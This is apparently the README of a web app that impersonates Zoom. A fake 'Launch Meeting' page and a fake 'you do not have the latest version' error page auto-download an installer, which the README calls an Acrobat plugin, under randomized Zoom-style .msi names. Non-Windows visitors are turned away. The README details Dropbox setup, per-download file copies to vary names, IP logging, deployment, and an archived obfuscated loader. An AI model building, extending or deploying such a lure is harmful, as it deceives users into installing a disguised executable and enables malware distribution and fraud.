# Zoom launch / download app

One Vite + Express app that combines the two earlier prototypes:

| Route | File | What it does |
|---|---|---|
| `/` | `index.html` | Zoom "Launch Meeting" mock: cookie banner, device/audio/video checks, **Launch**, then a "can't open Zoom? / Download Now" step. Non-Windows visitors see an "Access Restricted" page instead. |
| `/join` | `public/join.html` | The Zoom-styled error page: spinner + "Sorry, you do not have the latest version of Zoom Workspace App installed" + "If the download doesn't start automatically, **Please download manually**". Starts the download itself. |
| `/api/download` | `api/download.js` | Copies the installer in Dropbox to a per‑download Zoom‑style name, mints a fresh **temporary link** for that copy and `302`s to it. Requires `?token=`, Windows user agent only. |
| `/api/logs` | `api/logs.js` | Pre-existing log endpoint (`?secret=<LOG_SECRET>`). Nothing writes the log files any more, so it currently answers `[]`. |

Both buttons on `/` ("Launch meeting" and "Download Now") go to `/join`.
Every visit is identical: there is **no first‑visit / repeat‑visit logic and no
`ips.txt` any more** — the only record of a visit is the `token` + IP line the
download endpoint writes to the server log, and the temporary copy it leaves in
Dropbox until the next request sweeps it away.

## How a download happens

```
/  --click-->  /join  --inline script-->  /api/download?token=<per-visit token>
                                              |  1. files/copy_v2           copy -> Zoom_cm_<random>.msi
                                              |  2. files/get_temporary_link link for that copy
                                              |  3. 302
                                              v
                            https://dl.dropboxusercontent.com/... 8.7 MB from Dropbox
                            content-disposition: attachment; filename="Zoom_cm_<random>.msi"
```

* `token` is generated in the browser, one per page view, and used for both the
  hidden `#download-frame` iframe and the manual link.
* Requests without a token, or with a non‑Windows user agent, are refused (400 / 403).
* The bytes never pass through this app: Dropbox serves them. What changes per
  download is the name, and that name comes from the copy — Dropbox names the saved
  file after the stored file name (`content-disposition` on its links overrides
  anything we could set ourselves).
* `GET /api/logs` still answers `[]` (see below); nothing writes the old log files.
* Requests are limited per IP: **10 downloads / 15 minutes** per server instance
  (in-memory, cleared on restart / cold start).

## Run it

```
npm install
copy .env.example .env     (fill in the DROPBOX_* values)
npm run build              # Vite: dist/index.html + dist/join.html + dist/img, dist/files
npm start                  # Express serves dist/ and the api/ routes on PORT
```

`npm run dev` starts the Vite dev server (default port 5173) which serves both
pages at `/` and `/join`, but **not** `/api/download` — run `npm start` (or
`npm run dev:server`) alongside it when you need the download endpoint.

`npm test` runs the Node test-runner suite (`node --test "test/*.test.js"`):
download handler, Dropbox client and rate limiter.

## Dropbox setup

1. Create a **Scoped access / App folder** app at <https://www.dropbox.com/developers/apps>
   and enable **both** `files.content.read` (to link the file) and
   `files.content.write` (to create and delete the per-download copies).
2. Copy the App key + App secret into `.env`.
3. Upload the installer into the app folder (`Dropbox/Apps/<AppName>/`). Its name must
   match `DOWNLOAD_FILE_PATH` exactly — case-sensitive, starting with `/`.
4. `npm run dropbox-refresh-token` prints a refresh token to paste into `.env`.
   Existing tokens keep the scopes they were created with, so mint the token
   *after* enabling both scopes — and mint it again if you add a scope later.
5. `npm run dropbox:list-files` prints the exact paths the app can see, so you can
   check a rename took effect.

Only one file lives in Dropbox — the Acrobat reader plugin installer named by
`DOWNLOAD_FILE_PATH`. It is never renamed or modified. Each download is served
from a **server-side copy** of it, created by `files/copy_v2` (instant, nothing
uploaded) and named from `DOWNLOAD_NAME_TEMPLATE`, where `{random}` is a fresh
55-character segment (A–Z a–z 0–9 `-` `_` `@`) per download:

    /Zoom_cm_fo42mnktZ9vvrZo4_ZBZfVomTdyHFwsbEB5OqCqmxeKATExWRLiTiMaoJiyI5lkbpskqh6Sr_k6c8493c377d76800_.msi

The copy is needed because Dropbox serves the bytes and names the saved file
after the *stored* file name (`content-disposition: attachment; filename="…"`
on its `dl.dropboxusercontent.com` links), so a plain redirect can only ever
offer the source name. Copies older than `DOWNLOAD_COPY_TTL_MINUTES` are deleted
lazily — each request also removes its own old copies, matched by the fixed
prefix of the template; there is no cron and no queue.

## Environment

| Variable | Required | Meaning |
|---|---|---|
| `PORT` | no | Listen port (default `3000`; Vercel sets its own) |
| `DROPBOX_APP_KEY` / `DROPBOX_APP_SECRET` / `DROPBOX_REFRESH_TOKEN` | yes | Dropbox app credentials |
| `DOWNLOAD_FILE_PATH` | yes | Path of the **source** installer inside the Dropbox app folder |
| `DOWNLOAD_NAME_TEMPLATE` | no | Name each download is served under; `{random}` is replaced per download (default: `Zoom_cm_fo42mnktZ9vvrZo4_{random}_k6c8493c377d76800_.msi`) |
| `DOWNLOAD_COPY_TTL_MINUTES` | no | How long a per-download copy survives (default `15`) |
| `TRUST_PROXY` | on Vercel / behind a proxy | `1` makes `req.ip` (rate limit + logs) the real client IP from `X-Forwarded-For` |
| `LOG_SECRET` | no | Secret checked by `/api/logs` |

## Deploy (Vercel)

`vercel.json` sets `framework: vite`, `buildCommand: npm run build` and
`outputDirectory: dist`; everything in `api/` becomes a serverless function, and
extensionless `/join` works on static hosting without a rewrite. Set all
`DROPBOX_*`, `DOWNLOAD_FILE_PATH` (and, if you change them,
`DOWNLOAD_NAME_TEMPLATE` / `DOWNLOAD_COPY_TTL_MINUTES`) and `TRUST_PROXY=1` in the
Vercel project environment. Note that the per-IP rate limit lives in `server.js`
and is in-memory per instance: on Vercel the functions are stateless, so that
limiter only protects a long-lived local server, not serverless deployments.

## Archive / reference only

Everything that is not part of the running app lives in `Archive/` (git-ignored,
never deployed), with the two prototypes' own `.git` history intact:

* `Archive/Zo0M.php` — PHP original of `public/join.html` (IP logging, `ips.txt`
  redirect, obfuscated loader script, hidden `php-iframe` pointing at a missing
  `dw.php`, 30-second redirect, missing `zoom.ico` favicon).
* `Archive/preview/` — the earlier standalone copy of the launch mock, now `index.html`.
* `Archive/cpa-fluffy-guacamole/` and `Archive/special-octo-waffle/` — the two
  predecessor projects (static `public/files/*.msi` delivery, then the Dropbox
  temporary-link version), plus `Archive/cpa-fluffy-guacamole.zip`.
* `Archive/ind.htm` — the empty placeholder that used to sit in `public/files/`;
  nothing referenced it.

The old Acrobat landing page (`src/main.js` + `src/style.css`, "Click the
**Downloads** icon above / Then click Zoom... .exe") is gone; the merged app has
no `src/` folder — both pages are self-contained HTML.